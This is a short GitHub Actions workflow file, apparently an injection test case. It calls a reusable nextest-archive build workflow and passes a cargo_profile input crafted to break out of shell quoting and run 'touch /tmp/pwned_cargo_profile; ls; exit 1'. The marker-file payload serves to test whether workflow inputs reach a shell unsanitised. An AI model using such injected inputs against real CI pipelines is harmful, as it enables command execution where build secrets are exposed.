name: argus-call-44
on:
  workflow_dispatch:
jobs:
  call:
    uses: ./.github/workflows/build-nextest-archives.yml
    with:
      cargo_profile: "x\"; touch /tmp/pwned_cargo_profile; ls; exit 1; #"
      timeout_minutes: "1"
      archive_label: "x"
      target_group: "x"
